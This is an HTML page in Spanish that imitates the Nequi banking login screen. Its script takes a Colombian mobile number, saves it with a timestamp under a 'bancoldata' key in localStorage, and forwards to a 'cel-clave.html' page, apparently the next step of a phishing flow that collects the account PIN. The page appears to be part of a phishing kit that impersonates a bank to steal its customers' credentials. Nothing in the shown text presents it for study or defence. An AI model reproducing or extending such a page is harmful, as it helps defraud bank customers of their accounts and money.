<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ingreso</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@600;700&display=swap" rel="stylesheet">

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #2b002b;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  overflow: hidden; /* 🔒 evita que se mueva */
  color: white;
}

/* CONTENEDOR FIJO */
.container {
  width: 100%;
  max-width: 420px;
  height: 100vh;
  display: flex;
  flex-direction: column;
  padding: 20px;
  box-sizing: border-box;
}

/* HEADER */
header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

/* ICONO */
.help-icon {
  width: 20px;
  height: 20px;
  border: 2px solid white;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
  font-size: 14px;
}

/* ZONA CENTRAL */
.main {
  flex: 1;
  display: flex;
  flex-direction: column;
  justify-content: center; /* 🔥 centra todo */
}

/* LOGO */
.logo {
  text-align: center;
  font-family: 'Inter', sans-serif;
  font-size: 48px;
  font-weight: 700;
  letter-spacing: -1px;
}

.logo span {
  color: #ff008c;
  font-size: 50px;
  margin-right: 6px;
}

/* FORM */
.form {
  margin-top: 40px;
}

.input-box {
  background: rgba(255,255,255,0.2);
  border-radius: 8px;
  padding: 10px;
  display: flex;
  align-items: center;
  gap: 10px;
}

.prefix {
  border-right: 2px solid rgba(255,255,255,0.3);
  padding-right: 10px;
  font-weight: bold;
  color: #ffb3e6;
}

.input-box input {
  flex: 1;
  border: none;
  outline: none;
  background: transparent;
  color: white;
  font-size: 16px;
}

.input-box input::placeholder {
  color: #ddd;
}

/* BOTÓN */
.btn {
  margin-top: 15px;
  width: 100%;
  padding: 14px;
  border: none;
  border-radius: 8px;
  background: #ff008c;
  color: white;
  font-size: 16px;
  cursor: pointer;
  opacity: 0.5;
  transition: 0.3s;
}

.btn.active {
  opacity: 1;
}

.btn:active {
  transform: scale(0.97);
}

svg {
  color: #ccc;
}
</style>
</head>

<body>

<div class="container">

  <!-- HEADER -->
  <header>
    <div class="help-icon">?</div>

    <div>
      <svg width="70px" height="24px" viewBox="0 0 118 40">
        <text x="0" y="25" fill="white" font-size="20">Nequi</text>
      </svg>
    </div>
  </header>

  <!-- CONTENIDO CENTRADO -->
  <div class="main">

    <!-- LOGO -->
    <div class="logo">
      <span>■</span>Nequi
    </div>

    <!-- FORM -->
    <div class="form">
      <div class="input-box">
        <div class="prefix">+57</div>
        <input type="text" id="phoneInput" placeholder="Ingresa tu cel" maxlength="12">
      </div>

      <button class="btn" id="btn">Entra</button>
    </div>

  </div>

</div>

<script>
const input = document.getElementById("phoneInput");
const btn = document.getElementById("btn");

function formatNumber(value) {
  let digits = value.replace(/\D/g, "");
  if (digits.length > 10) digits = digits.slice(0, 10);

  if (digits.length > 6) {
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (digits.length > 3) {
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

input.addEventListener("input", () => {
  input.value = formatNumber(input.value);

  const digits = input.value.replace(/\D/g, "");

  if (digits.length === 10 && digits.startsWith("3")) {
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

btn.addEventListener("click", () => {
  const raw = input.value.replace(/\D/g, "");

  if (raw.length !== 10 || !raw.startsWith("3")) {
    alert("Número inválido");
    return;
  }

  let data = {};
  try {
    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
  } catch {
    data = {};
  }

  data.numero = raw;
  data.fecha = new Date().toISOString();

  localStorage.setItem("bancoldata", JSON.stringify(data));

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
